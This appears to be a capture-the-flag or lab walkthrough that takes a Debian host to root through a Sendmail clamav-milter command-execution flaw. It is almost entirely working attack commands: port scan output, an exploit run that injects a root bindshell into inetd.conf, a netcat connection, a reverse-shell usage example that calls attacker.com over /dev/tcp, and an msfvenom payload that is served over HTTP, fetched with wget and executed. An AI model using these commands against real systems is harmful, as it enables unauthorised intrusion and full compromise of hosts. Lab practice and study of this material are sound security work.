## OPEN PORTS
```bash
22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
```
## FOOTHOLD
```bash
# Exploit 4761.pl
searchsploit sendmail
Sendmail with clamav-milter < 0.91.2 - Remote Command Execution| multiple/remote/4761.pl

# Execute
perl 4761.pl 192.168.205.42

# Note - creates a bindshell on port 31337 as root
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok                                    
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok                               

# connect to port 31337
sudo nc -nvv $ip 31337

# root
```
## METHOD II
```bash
# Download
https://github.com/0x1sac/ClamAV-Milter-Sendmail-0.91.2-Remote-Code-Execution

# compile
sudo gcc exploit.c -o exploit
# Check exploit
./exploit
usage: ./exploit <RHOST> <RPORT> <COMMAND>                                                                                                              [example]                                                                                                                                               
./exploit victim.com 25 '/usr/bin/env sleep 10' -v                                     
./exploit victim.com 25 "/usr/bin/env bash -c 'bash -i >&/dev/tcp/attacker.com/443 0>&1'"  

# Create reverse shell
sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.203 LPORT=443 -f elf -o shell.elf
# host server to download shell.elf
sudo python3 -m http.server 80

# listen on port 443 from kali machine
sudo nc -nvlp 443

# Exploit
./exploit 192.168.205.42 25 'wget 192.168.45.203/shell.elf' -v 
./exploit 192.168.205.42 25 'chmod +x ./shell.elf' -v 
./exploit 192.168.205.42 25 './shell.elf' -v

# root
```